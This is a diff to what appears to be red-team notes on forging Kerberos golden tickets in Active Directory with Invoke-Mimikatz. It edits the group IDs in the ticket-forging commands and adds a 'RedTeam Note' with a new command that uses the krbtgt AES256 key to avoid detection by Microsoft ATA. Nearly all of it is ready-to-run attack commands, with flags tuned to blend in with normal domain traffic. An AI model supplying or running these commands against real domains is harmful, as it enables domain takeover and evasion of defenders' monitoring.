@@ -26,9 +26,9 @@ After that we need to create the ticket.
 * **Invoke-Mimikatz**
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /ticket"'
 ```
 > **Note**: `/ptt` injects the ticket in current PowerShell process.
 >
@@ -39,6 +39,12 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.loc
 > `/endin:600` Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600).
 >
 > `/renewmax:10080` Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080)
+
+> **RedTeam Note**: To prevent beeing detected of ATA use the `aes256` keys.
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /id:500 /groups:513 /startoffset:0 /endin:600 /renewmax:10080 /aes256:<aes256keysofkrbtgt> /ptt"'
+```
 
 * **Rubeus.exe**
 
